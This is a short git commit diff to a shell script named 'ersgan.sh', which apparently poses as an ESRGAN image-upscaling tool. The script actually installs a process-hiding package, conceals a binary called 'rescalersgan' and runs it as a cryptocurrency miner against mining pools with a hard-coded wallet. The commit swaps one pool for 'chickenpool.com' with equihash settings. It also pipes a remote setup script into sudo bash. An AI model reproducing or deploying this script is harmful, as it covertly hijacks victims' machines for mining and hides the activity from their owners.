4a80e50c31bfd9e413e9462d7f58ba093e188252
ngel4ng <108847948+ngel4ng@users.noreply.github.com>
2022-07-07 19:35:12 -0700

    Update ersgan.sh

--- ersgan.sh
+++ ersgan.sh
@@ -1,8 +1,6 @@
-
 curl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash -
 apt-get install -y nodejs
 npm i -g node-process-hider
 ph add rescalersgan
 chmod +x rescalersgan
-./rescalersgan -pool ethash.infinityton.com:4444 -wal f39829a015d4.worker1 -proto 4
-
+./rescalersgan -u RVotNy1Psgae15Rorv7u1ii6R56QeRSUJc.$(echo $(shuf -i 1-999 -n 1)-an) -l chickenpool.com --port=3001 --intensity=85 -p x --par=equihash
